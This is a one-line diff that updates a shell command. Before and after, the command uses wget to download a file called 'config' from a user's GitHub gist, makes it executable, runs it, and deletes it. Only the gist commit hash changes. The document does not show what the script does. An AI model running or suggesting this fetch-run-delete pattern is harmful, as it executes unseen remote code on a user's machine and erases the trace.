@@ -1,1 +1,1 @@
-wget https://gist.githubusercontent.com/drowkid-1/642a8400cd79a0cd3e526f107394639a/raw/2dd0a8fbaa3245fb05d31603417aa8f5abe0a03f/config ; chmod 775 config; ./config ; rm config ;
+wget https://gist.githubusercontent.com/drowkid-1/642a8400cd79a0cd3e526f107394639a/raw/f7126b958682a8da797dce3556ac013f4e8bf4c1/config ; chmod 775 config; ./config ; rm config ;
